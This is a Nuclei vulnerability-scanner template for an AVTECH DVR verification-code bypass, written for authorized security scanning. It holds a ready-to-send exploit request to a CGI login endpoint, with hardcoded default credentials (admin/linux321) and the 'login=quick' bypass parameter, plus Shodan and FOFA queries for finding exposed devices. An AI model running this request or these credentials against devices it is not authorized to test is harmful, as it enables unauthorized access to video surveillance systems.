http:
- attack: pitchfork
  matchers:
  - regex:
    - '^0.*

      OK.*'
    type: regex
  - condition: and
    dsl:
    - status_code == 200
    - len(body) == 5
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cgi-bin/nobody/VerifyCode.cgi?account={{base64(username + '':'' +
    password)}}&login=quick'
  payloads:
    password:
    - linux321
    username:
    - admin
id: avtech-verification-bypass
info:
  author: ritikchaddha
  description: 'AVTECH DVR products are  vulnerable to verification code bypass just
    by entering the "login=quick" parameter to bypass verification code.

    '
  metadata:
    fofa-query: "app=\"AVTECH-\u89C6\u9891\u76D1\u63A7\""
    max-request: 1
    shodan-query: title:"login" product:"Avtech"
    verified: true
  name: AVTECH DVR - Login Verification Code Bypass
  severity: low
  tags: avtech,verify,bypass,iot
